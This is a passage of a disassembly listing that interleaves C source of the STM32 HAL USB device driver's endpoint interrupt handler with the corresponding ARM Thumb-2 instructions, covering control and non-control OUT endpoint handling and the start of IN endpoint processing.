          /* Process SETUP Packet*/
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->SetupStageCallback(hpcd);
#else
          HAL_PCD_SetupStageCallback(hpcd);
 8002876:	6878      	ldr	r0, [r7, #4]
 8002878:	f00a f904 	bl	800ca84 <HAL_PCD_SetupStageCallback>
 800287c:	e306      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else if ((wEPVal & USB_EP_CTR_RX) != 0U)
 800287e:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002882:	2b00      	cmp	r3, #0
 8002884:	f280 8302 	bge.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
        {
          PCD_CLEAR_RX_EP_CTR(hpcd->Instance, PCD_ENDP0);
 8002888:	687b      	ldr	r3, [r7, #4]
 800288a:	681b      	ldr	r3, [r3, #0]
 800288c:	881b      	ldrh	r3, [r3, #0]
 800288e:	b29a      	uxth	r2, r3
 8002890:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002894:	4013      	ands	r3, r2
 8002896:	83fb      	strh	r3, [r7, #30]
 8002898:	687b      	ldr	r3, [r7, #4]
 800289a:	681b      	ldr	r3, [r3, #0]
 800289c:	8bfa      	ldrh	r2, [r7, #30]
 800289e:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 80028a2:	b292      	uxth	r2, r2
 80028a4:	801a      	strh	r2, [r3, #0]

          /* Get Control Data OUT Packet */
          ep->xfer_count = PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028a6:	687b      	ldr	r3, [r7, #4]
 80028a8:	681b      	ldr	r3, [r3, #0]
 80028aa:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028ae:	b29b      	uxth	r3, r3
 80028b0:	461a      	mov	r2, r3
 80028b2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028b4:	781b      	ldrb	r3, [r3, #0]
 80028b6:	00db      	lsls	r3, r3, #3
 80028b8:	4413      	add	r3, r2
 80028ba:	687a      	ldr	r2, [r7, #4]
 80028bc:	6812      	ldr	r2, [r2, #0]
 80028be:	4413      	add	r3, r2
 80028c0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028c4:	881b      	ldrh	r3, [r3, #0]
 80028c6:	f3c3 0209 	ubfx	r2, r3, #0, #10
 80028ca:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028cc:	61da      	str	r2, [r3, #28]

          if ((ep->xfer_count != 0U) && (ep->xfer_buff != 0U))
 80028ce:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d0:	69db      	ldr	r3, [r3, #28]
 80028d2:	2b00      	cmp	r3, #0
 80028d4:	d019      	beq.n	800290a <PCD_EP_ISR_Handler+0x1ec>
 80028d6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028d8:	695b      	ldr	r3, [r3, #20]
 80028da:	2b00      	cmp	r3, #0
 80028dc:	d015      	beq.n	800290a <PCD_EP_ISR_Handler+0x1ec>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80028de:	687b      	ldr	r3, [r7, #4]
 80028e0:	6818      	ldr	r0, [r3, #0]
 80028e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e4:	6959      	ldr	r1, [r3, #20]
 80028e6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e8:	88da      	ldrh	r2, [r3, #6]
                        ep->pmaadress, (uint16_t)ep->xfer_count);
 80028ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ec:	69db      	ldr	r3, [r3, #28]
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff,
 80028ee:	b29b      	uxth	r3, r3
 80028f0:	f005 fed5 	bl	800869e <USB_ReadPMA>

            ep->xfer_buff += ep->xfer_count;
 80028f4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028f6:	695a      	ldr	r2, [r3, #20]
 80028f8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028fa:	69db      	ldr	r3, [r3, #28]
 80028fc:	441a      	add	r2, r3
 80028fe:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002900:	615a      	str	r2, [r3, #20]

            /* Process Control Data OUT Packet */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
            hpcd->DataOutStageCallback(hpcd, 0U);
#else
            HAL_PCD_DataOutStageCallback(hpcd, 0U);
 8002902:	2100      	movs	r1, #0
 8002904:	6878      	ldr	r0, [r7, #4]
 8002906:	f00a f8cf 	bl	800caa8 <HAL_PCD_DataOutStageCallback>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
          }

          wEPVal = (uint16_t)PCD_GET_ENDPOINT(hpcd->Instance, PCD_ENDP0);
 800290a:	687b      	ldr	r3, [r7, #4]
 800290c:	681b      	ldr	r3, [r3, #0]
 800290e:	881b      	ldrh	r3, [r3, #0]
 8002910:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

          if (((wEPVal & USB_EP_SETUP) == 0U) && ((wEPVal & USB_EP_RX_STRX) != USB_EP_RX_VALID))
 8002914:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002918:	f403 6300 	and.w	r3, r3, #2048	; 0x800
 800291c:	2b00      	cmp	r3, #0
 800291e:	f040 82b5 	bne.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
 8002922:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002926:	f403 5340 	and.w	r3, r3, #12288	; 0x3000
 800292a:	f5b3 5f40 	cmp.w	r3, #12288	; 0x3000
 800292e:	f000 82ad 	beq.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
          {
            PCD_SET_EP_RX_CNT(hpcd->Instance, PCD_ENDP0, ep->maxpacket);
 8002932:	687b      	ldr	r3, [r7, #4]
 8002934:	681b      	ldr	r3, [r3, #0]
 8002936:	61bb      	str	r3, [r7, #24]
 8002938:	687b      	ldr	r3, [r7, #4]
 800293a:	681b      	ldr	r3, [r3, #0]
 800293c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002940:	b29b      	uxth	r3, r3
 8002942:	461a      	mov	r2, r3
 8002944:	69bb      	ldr	r3, [r7, #24]
 8002946:	4413      	add	r3, r2
 8002948:	61bb      	str	r3, [r7, #24]
 800294a:	69bb      	ldr	r3, [r7, #24]
 800294c:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002950:	617b      	str	r3, [r7, #20]
 8002952:	697b      	ldr	r3, [r7, #20]
 8002954:	881b      	ldrh	r3, [r3, #0]
 8002956:	b29b      	uxth	r3, r3
 8002958:	f3c3 0309 	ubfx	r3, r3, #0, #10
 800295c:	b29a      	uxth	r2, r3
 800295e:	697b      	ldr	r3, [r7, #20]
 8002960:	801a      	strh	r2, [r3, #0]
 8002962:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002964:	691b      	ldr	r3, [r3, #16]
 8002966:	2b3e      	cmp	r3, #62	; 0x3e
 8002968:	d91d      	bls.n	80029a6 <PCD_EP_ISR_Handler+0x288>
 800296a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800296c:	691b      	ldr	r3, [r3, #16]
 800296e:	095b      	lsrs	r3, r3, #5
 8002970:	647b      	str	r3, [r7, #68]	; 0x44
 8002972:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002974:	691b      	ldr	r3, [r3, #16]
 8002976:	f003 031f 	and.w	r3, r3, #31
 800297a:	2b00      	cmp	r3, #0
 800297c:	d102      	bne.n	8002984 <PCD_EP_ISR_Handler+0x266>
 800297e:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 8002980:	3b01      	subs	r3, #1
 8002982:	647b      	str	r3, [r7, #68]	; 0x44
 8002984:	697b      	ldr	r3, [r7, #20]
 8002986:	881b      	ldrh	r3, [r3, #0]
 8002988:	b29a      	uxth	r2, r3
 800298a:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 800298c:	b29b      	uxth	r3, r3
 800298e:	029b      	lsls	r3, r3, #10
 8002990:	b29b      	uxth	r3, r3
 8002992:	4313      	orrs	r3, r2
 8002994:	b29b      	uxth	r3, r3
 8002996:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 800299a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 800299e:	b29a      	uxth	r2, r3
 80029a0:	697b      	ldr	r3, [r7, #20]
 80029a2:	801a      	strh	r2, [r3, #0]
 80029a4:	e026      	b.n	80029f4 <PCD_EP_ISR_Handler+0x2d6>
 80029a6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029a8:	691b      	ldr	r3, [r3, #16]
 80029aa:	2b00      	cmp	r3, #0
 80029ac:	d10a      	bne.n	80029c4 <PCD_EP_ISR_Handler+0x2a6>
 80029ae:	697b      	ldr	r3, [r7, #20]
 80029b0:	881b      	ldrh	r3, [r3, #0]
 80029b2:	b29b      	uxth	r3, r3
 80029b4:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 80029b8:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 80029bc:	b29a      	uxth	r2, r3
 80029be:	697b      	ldr	r3, [r7, #20]
 80029c0:	801a      	strh	r2, [r3, #0]
 80029c2:	e017      	b.n	80029f4 <PCD_EP_ISR_Handler+0x2d6>
 80029c4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029c6:	691b      	ldr	r3, [r3, #16]
 80029c8:	085b      	lsrs	r3, r3, #1
 80029ca:	647b      	str	r3, [r7, #68]	; 0x44
 80029cc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029ce:	691b      	ldr	r3, [r3, #16]
 80029d0:	f003 0301 	and.w	r3, r3, #1
 80029d4:	2b00      	cmp	r3, #0
 80029d6:	d002      	beq.n	80029de <PCD_EP_ISR_Handler+0x2c0>
 80029d8:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029da:	3301      	adds	r3, #1
 80029dc:	647b      	str	r3, [r7, #68]	; 0x44
 80029de:	697b      	ldr	r3, [r7, #20]
 80029e0:	881b      	ldrh	r3, [r3, #0]
 80029e2:	b29a      	uxth	r2, r3
 80029e4:	6c7b      	ldr	r3, [r7, #68]	; 0x44
 80029e6:	b29b      	uxth	r3, r3
 80029e8:	029b      	lsls	r3, r3, #10
 80029ea:	b29b      	uxth	r3, r3
 80029ec:	4313      	orrs	r3, r2
 80029ee:	b29a      	uxth	r2, r3
 80029f0:	697b      	ldr	r3, [r7, #20]
 80029f2:	801a      	strh	r2, [r3, #0]
            PCD_SET_EP_RX_STATUS(hpcd->Instance, PCD_ENDP0, USB_EP_RX_VALID);
 80029f4:	687b      	ldr	r3, [r7, #4]
 80029f6:	681b      	ldr	r3, [r3, #0]
 80029f8:	881b      	ldrh	r3, [r3, #0]
 80029fa:	b29b      	uxth	r3, r3
 80029fc:	f423 4380 	bic.w	r3, r3, #16384	; 0x4000
 8002a00:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002a04:	827b      	strh	r3, [r7, #18]
 8002a06:	8a7b      	ldrh	r3, [r7, #18]
 8002a08:	f483 5380 	eor.w	r3, r3, #4096	; 0x1000
 8002a0c:	827b      	strh	r3, [r7, #18]
 8002a0e:	8a7b      	ldrh	r3, [r7, #18]
 8002a10:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 8002a14:	827b      	strh	r3, [r7, #18]
 8002a16:	687b      	ldr	r3, [r7, #4]
 8002a18:	681a      	ldr	r2, [r3, #0]
 8002a1a:	8a7b      	ldrh	r3, [r7, #18]
 8002a1c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002a20:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002a24:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002a28:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002a2c:	b29b      	uxth	r3, r3
 8002a2e:	8013      	strh	r3, [r2, #0]
 8002a30:	e22c      	b.n	8002e8c <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 8002a32:	687b      	ldr	r3, [r7, #4]
 8002a34:	681b      	ldr	r3, [r3, #0]
 8002a36:	461a      	mov	r2, r3
 8002a38:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a3c:	009b      	lsls	r3, r3, #2
 8002a3e:	4413      	add	r3, r2
 8002a40:	881b      	ldrh	r3, [r3, #0]
 8002a42:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 8002a46:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002a4a:	2b00      	cmp	r3, #0
 8002a4c:	f280 80f6 	bge.w	8002c3c <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002a50:	687b      	ldr	r3, [r7, #4]
 8002a52:	681b      	ldr	r3, [r3, #0]
 8002a54:	461a      	mov	r2, r3
 8002a56:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a5a:	009b      	lsls	r3, r3, #2
 8002a5c:	4413      	add	r3, r2
 8002a5e:	881b      	ldrh	r3, [r3, #0]
 8002a60:	b29a      	uxth	r2, r3
 8002a62:	f640 738f 	movw	r3, #3983	; 0xf8f
 8002a66:	4013      	ands	r3, r2
 8002a68:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002a6c:	687b      	ldr	r3, [r7, #4]
 8002a6e:	681b      	ldr	r3, [r3, #0]
 8002a70:	461a      	mov	r2, r3
 8002a72:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a76:	009b      	lsls	r3, r3, #2
 8002a78:	4413      	add	r3, r2
 8002a7a:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002a7e:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 8002a82:	b292      	uxth	r2, r2
 8002a84:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 8002a86:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002a8a:	4613      	mov	r3, r2
 8002a8c:	009b      	lsls	r3, r3, #2
 8002a8e:	4413      	add	r3, r2
 8002a90:	00db      	lsls	r3, r3, #3
 8002a92:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 8002a96:	687a      	ldr	r2, [r7, #4]
 8002a98:	4413      	add	r3, r2
 8002a9a:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 8002a9c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a9e:	7b1b      	ldrb	r3, [r3, #12]
 8002aa0:	2b00      	cmp	r3, #0
 8002aa2:	d123      	bne.n	8002aec <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 8002aa4:	687b      	ldr	r3, [r7, #4]
 8002aa6:	681b      	ldr	r3, [r3, #0]
 8002aa8:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002aac:	b29b      	uxth	r3, r3
 8002aae:	461a      	mov	r2, r3
 8002ab0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ab2:	781b      	ldrb	r3, [r3, #0]
 8002ab4:	00db      	lsls	r3, r3, #3
 8002ab6:	4413      	add	r3, r2
 8002ab8:	687a      	ldr	r2, [r7, #4]
 8002aba:	6812      	ldr	r2, [r2, #0]
 8002abc:	4413      	add	r3, r2
 8002abe:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002ac2:	881b      	ldrh	r3, [r3, #0]
 8002ac4:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002ac8:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 8002acc:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002ad0:	2b00      	cmp	r3, #0
 8002ad2:	f000 808e 	beq.w	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 8002ad6:	687b      	ldr	r3, [r7, #4]
 8002ad8:	6818      	ldr	r0, [r3, #0]
 8002ada:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002adc:	6959      	ldr	r1, [r3, #20]
 8002ade:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ae0:	88da      	ldrh	r2, [r3, #6]
 8002ae2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002ae6:	f005 fdda 	bl	800869e <USB_ReadPMA>
 8002aea:	e082      	b.n	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 8002aec:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aee:	78db      	ldrb	r3, [r3, #3]
 8002af0:	2b02      	cmp	r3, #2
 8002af2:	d10a      	bne.n	8002b0a <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 8002af4:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002af8:	461a      	mov	r2, r3
 8002afa:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002afc:	6878      	ldr	r0, [r7, #4]
 8002afe:	f000 f9d3 	bl	8002ea8 <HAL_PCD_EP_DB_Receive>
 8002b02:	4603      	mov	r3, r0
 8002b04:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002b08:	e073      	b.n	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002b0a:	687b      	ldr	r3, [r7, #4]
 8002b0c:	681b      	ldr	r3, [r3, #0]
 8002b0e:	461a      	mov	r2, r3
 8002b10:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b12:	781b      	ldrb	r3, [r3, #0]
 8002b14:	009b      	lsls	r3, r3, #2
 8002b16:	4413      	add	r3, r2
 8002b18:	881b      	ldrh	r3, [r3, #0]
 8002b1a:	b29b      	uxth	r3, r3
 8002b1c:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002b20:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002b24:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002b28:	687b      	ldr	r3, [r7, #4]
 8002b2a:	681b      	ldr	r3, [r3, #0]
 8002b2c:	461a      	mov	r2, r3
 8002b2e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b30:	781b      	ldrb	r3, [r3, #0]
 8002b32:	009b      	lsls	r3, r3, #2
 8002b34:	441a      	add	r2, r3
 8002b36:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002b3a:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002b3e:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8002b42:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002b46:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002b4a:	b29b      	uxth	r3, r3
 8002b4c:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002b4e:	687b      	ldr	r3, [r7, #4]
 8002b50:	681b      	ldr	r3, [r3, #0]
 8002b52:	461a      	mov	r2, r3
 8002b54:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b56:	781b      	ldrb	r3, [r3, #0]
 8002b58:	009b      	lsls	r3, r3, #2
 8002b5a:	4413      	add	r3, r2
 8002b5c:	881b      	ldrh	r3, [r3, #0]
 8002b5e:	b29b      	uxth	r3, r3
 8002b60:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8002b64:	2b00      	cmp	r3, #0
 8002b66:	d022      	beq.n	8002bae <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002b68:	687b      	ldr	r3, [r7, #4]
 8002b6a:	681b      	ldr	r3, [r3, #0]
 8002b6c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b70:	b29b      	uxth	r3, r3
 8002b72:	461a      	mov	r2, r3
 8002b74:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b76:	781b      	ldrb	r3, [r3, #0]
 8002b78:	00db      	lsls	r3, r3, #3
 8002b7a:	4413      	add	r3, r2
 8002b7c:	687a      	ldr	r2, [r7, #4]
 8002b7e:	6812      	ldr	r2, [r2, #0]
 8002b80:	4413      	add	r3, r2
 8002b82:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b86:	881b      	ldrh	r3, [r3, #0]
 8002b88:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b8c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002b90:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002b94:	2b00      	cmp	r3, #0
 8002b96:	d02c      	beq.n	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 8002b98:	687b      	ldr	r3, [r7, #4]
 8002b9a:	6818      	ldr	r0, [r3, #0]
 8002b9c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b9e:	6959      	ldr	r1, [r3, #20]
 8002ba0:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ba2:	891a      	ldrh	r2, [r3, #8]
 8002ba4:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002ba8:	f005 fd79 	bl	800869e <USB_ReadPMA>
 8002bac:	e021      	b.n	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 8002bae:	687b      	ldr	r3, [r7, #4]
 8002bb0:	681b      	ldr	r3, [r3, #0]
 8002bb2:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bb6:	b29b      	uxth	r3, r3
 8002bb8:	461a      	mov	r2, r3
 8002bba:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bbc:	781b      	ldrb	r3, [r3, #0]
 8002bbe:	00db      	lsls	r3, r3, #3
 8002bc0:	4413      	add	r3, r2
 8002bc2:	687a      	ldr	r2, [r7, #4]
 8002bc4:	6812      	ldr	r2, [r2, #0]
 8002bc6:	4413      	add	r3, r2
 8002bc8:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bcc:	881b      	ldrh	r3, [r3, #0]
 8002bce:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002bd2:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002bd6:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bda:	2b00      	cmp	r3, #0
 8002bdc:	d009      	beq.n	8002bf2 <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 8002bde:	687b      	ldr	r3, [r7, #4]
 8002be0:	6818      	ldr	r0, [r3, #0]
 8002be2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be4:	6959      	ldr	r1, [r3, #20]
 8002be6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be8:	895a      	ldrh	r2, [r3, #10]
 8002bea:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bee:	f005 fd56 	bl	800869e <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 8002bf2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bf4:	69da      	ldr	r2, [r3, #28]
 8002bf6:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002bfa:	441a      	add	r2, r3
 8002bfc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bfe:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002c00:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c02:	695a      	ldr	r2, [r3, #20]
 8002c04:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002c08:	441a      	add	r2, r3
 8002c0a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c0c:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002c0e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c10:	699b      	ldr	r3, [r3, #24]
 8002c12:	2b00      	cmp	r3, #0
 8002c14:	d005      	beq.n	8002c22 <PCD_EP_ISR_Handler+0x504>
 8002c16:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002c1a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c1c:	691b      	ldr	r3, [r3, #16]
 8002c1e:	429a      	cmp	r2, r3
 8002c20:	d206      	bcs.n	8002c30 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002c22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c24:	781b      	ldrb	r3, [r3, #0]
 8002c26:	4619      	mov	r1, r3
 8002c28:	6878      	ldr	r0, [r7, #4]
 8002c2a:	f009 ff3d 	bl	800caa8 <HAL_PCD_DataOutStageCallback>
 8002c2e:	e005      	b.n	8002c3c <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002c30:	687b      	ldr	r3, [r7, #4]
 8002c32:	681b      	ldr	r3, [r3, #0]
 8002c34:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002c36:	4618      	mov	r0, r3
 8002c38:	f003 ffe3 	bl	8006c02 <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002c3c:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002c40:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002c44:	2b00      	cmp	r3, #0
 8002c46:	f000 8121 	beq.w	8002e8c <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002c4a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c4e:	1c5a      	adds	r2, r3, #1
 8002c50:	4613      	mov	r3, r2
 8002c52:	009b      	lsls	r3, r3, #2
 8002c54:	4413      	add	r3, r2
 8002c56:	00db      	lsls	r3, r3, #3
 8002c58:	687a      	ldr	r2, [r7, #4]
 8002c5a:	4413      	add	r3, r2
 8002c5c:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002c5e:	687b      	ldr	r3, [r7, #4]
 8002c60:	681b      	ldr	r3, [r3, #0]
 8002c62:	461a      	mov	r2, r3
 8002c64:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c68:	009b      	lsls	r3, r3, #2
 8002c6a:	4413      	add	r3, r2
 8002c6c:	881b      	ldrh	r3, [r3, #0]
 8002c6e:	b29b      	uxth	r3, r3
 8002c70:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002c74:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002c78:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002c7c:	687b      	ldr	r3, [r7, #4]
 8002c7e:	681b      	ldr	r3, [r3, #0]
 8002c80:	461a      	mov	r2, r3
 8002c82:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002c86:	009b      	lsls	r3, r3, #2
 8002c88:	441a      	add	r2, r3
 8002c8a:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002c8e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002c92:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002c96:	b29b      	uxth	r3, r3
 8002c98:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002c9a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c9c:	78db      	ldrb	r3, [r3, #3]
 8002c9e:	2b01      	cmp	r3, #1
 8002ca0:	f040 80a2 	bne.w	8002de8 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002ca4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ca6:	2200      	movs	r2, #0
 8002ca8:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002caa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002cac:	7b1b      	ldrb	r3, [r3, #12]
 8002cae:	2b00      	cmp	r3, #0
 8002cb0:	f000 8093 	beq.w	8002dda <PCD_EP_ISR_Handler+0x6bc>
          {
